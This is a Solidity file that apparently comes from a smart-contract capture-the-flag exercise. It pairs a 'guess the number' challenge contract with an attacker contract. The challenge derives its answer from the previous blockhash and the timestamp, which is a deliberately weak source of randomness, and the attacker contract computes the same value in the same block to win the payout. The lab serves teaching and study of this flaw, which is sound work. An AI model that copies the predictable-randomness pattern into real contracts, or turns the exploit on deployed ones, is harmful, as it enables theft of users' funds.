pragma solidity ^0.8.0;

contract GuessTheNewNumberChallenge {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        if (n == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}

contract GuessTheNewNumberAttacker {
    GuessTheNewNumberChallenge victim;

    constructor(address _victim) {
        victim = GuessTheNewNumberChallenge(_victim);
    }

    function attackContract() public payable {
        require(msg.value == 1 ether);
        uint8 myAnswer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        
        victim.guess{value: 1 ether}(myAnswer);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {

    }
}